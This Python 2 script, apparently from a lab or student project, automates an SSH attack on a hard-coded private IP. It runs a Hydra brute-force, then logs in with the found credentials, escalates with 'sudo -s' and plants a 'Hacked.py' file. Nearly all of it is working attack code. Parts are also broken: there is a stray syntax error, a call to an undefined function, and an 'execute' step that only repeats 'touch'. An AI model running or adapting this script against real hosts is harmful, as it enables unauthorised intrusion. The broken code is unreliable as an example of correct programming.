import os
import pexpect
import re
import time

def kill_hydra():
	os.system("pkill -f hydra")

'''def hydra_spawn(ip):
	''''''
	Start Hydra and find username and password for IP address
	If username and password found kill hydra 
	Execute collect data method
	''''''
	try:
		command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
		child = pexpect.spawn(command)
		if child.isalive():
			for lines in child:
				if "host" in lines and "login" in lines and "password" in lines:
					kill_hydra()
					collect_data(lines,ip)				
	except Exception, e:
		print str(e)'''
		
def hydra_spawn(ip):
	'''
	Start Hydra and find username and password for IP address
	If username and password found kill hydra 
	Execute collect data method
	'''
	try:
		print("Hydra BruteForce Being Executed")
		command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
		child = pexpect.spawn(command)	
		time.sleep(30)
		print("BruteForce Successfully Executed")
		child.close()
		kill_hydra()
		
	except Exception, e:
		print str(e)

	except pexpect.EOF:
		print("BruteForce Executed")
		child.close()
		kill_hydra()		

def collect_data(line,ip):
	'''
	Receive IP and Line
	Get username and password
	Store into array
	Collect username and password using array indexes
	Call clean colours method
	Call execute ssh method
	'''	
	try:
		user = ""
		password = ""
		array_data = []

		for words in line.split():
			array_data.append(words)

		username = clean_colours(array_data[4])
		password = clean_colours(array_data[6])

		#Generate random number to execute attack

		execute_ssh(username,password,ip)
	
	except Exception, e:
		print str(e)

def clean_colours(the_text):
	'''
	Clear colour text returned from terminal
	'''
	try:
		ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
		the_text = ansi_escape.sub('',the_text)
	s
	except Exception, e:
		print str(e)
	
	return the_text

#Make precautions for new key when prompted so
def execute_ssh_login(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("SSH sudo Login Being Executed")
		line = "ssh {}@{}".format(user,ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(password)
		child.expect("$")
		child.interact()
		
		print("SSH sudo Login Succesful ")
		
	except Exception, e:
		print str(e)
	
def execute_ssh_sudo(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("SSH sudo Login Being Executed") 
		line = "ssh {}@{}".format(user,ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(password)
		child.expect("$")
		child.sendline("sudo -s")
		child.expect("$")
		child.sendline(password)
		child.expect("$")
		child.interact()
		
		print("SSH sudo Login Succesful ")
		
	except Exception, e:
		print str(e)

def execute_ssh_create_file(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("File Being Created")
		line = "ssh {}@{}".format(user,ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(password)
		child.expect("$")
		child.sendline("touch Hacked.py")
		child.expect("$")
		child.interact()
		
		print("File Succesfully Created")
	
	except Exception, e:
		print str(e)

def execute_ssh_execute_file(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("File Being Executed")
		line = "ssh {}@{}".format(user,ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(password)
		child.expect("$")
		child.sendline("touch Hacked.py")
		child.expect("$")
		child.interact()
		
		print("File Succesfully Executed")
		
	except Exception, e:
		print str(e)
	

if __name__ == "__main__":
	hydra_spawn("10.0.5.37")
	#execute("ubuntu","10.0.5.41")

